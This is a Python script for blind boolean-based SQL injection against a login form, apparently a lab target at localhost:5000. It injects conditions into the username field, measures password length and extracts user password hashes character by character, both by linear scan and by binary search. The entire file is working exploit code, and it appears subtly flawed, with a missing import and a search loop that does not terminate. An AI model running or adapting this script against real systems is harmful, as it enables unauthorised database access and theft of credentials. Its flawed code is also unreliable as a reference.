

total_queries=0
char="0123456789abcdefghijklmnopqrstuvwxyz"
target="http://localhost:5000"
needle="Welcome"

def injected_query(payload):
    global total_queries
    r=requests.post(target,data={"username":"admin' and {}-- -".format(payload), "password":"password"})
    total_queries+=1
    return needle.encode() not in r.content

def boolean_query(offset,user_id,character,operator=">"):
    payload="(select hex(substr(password,{},1)) from user where id = {}) {} hex ('{}')".format(offset+1,user_id,operator,character)
    return injected_query(payload)

def invalid_user(user_id):
    payload="(select id from user where id = {}) >=0".format(user_id)
    return injected_query(payload)

def password_length(user_id):
    i=0
    while True:
        payload="(select length(password) from user where id={} and length(password) <= {} limit 1)".format(user_id,i)
        if not injected_query(payload):
            return i
        i+=1

def extract_hash(char,user_id,password_length):
    found=""
    for i in range(0, password_length):
        for j in range(len(char)):
            if boolean_query(i,user_id,char[j]):
                found+=char[j]
                break
    return found  

def extract_hash_bst(char,user_id,password_length):
    found=""
    for index in range(0,password_length):
        start=0
        end=len(char)-1
        while start<=end:
            if end-start==1:
                if start==0 and boolean_query(index,user_id,char[start]):
                    found+=char[start]
                else:
                    found+=char[start+1]
            else:
                middle=(start+end)//2
                if boolean_query(index,user_id,char[middle]):
                    end=middle
                else:
                    start=middle
    return found

def total_queries_execute():
    global total_queries
    print(f"-----total queries={total_queries}-----")
    total_queries=0

while True:
    try:
        user_id=input("Enter userr id to extract password hash -> ")
        if not invalid_user(user_id):
            user_password_length=password_length(user_id)
            print(f"User-{user_id}\n Password hash length{user_password_length}")
            total_queries_execute()
            print(f"Hash:{extract_hash(char,int(user_id),user_password_length)}")
            total_queries_execute()
            print(f"Hash:{extract_hash_bst(char,int(user_id),user_password_length)}")
            total_queries_execute()
        else:
            print("Invalid id")
    except KeyboardInterrupt:
        break
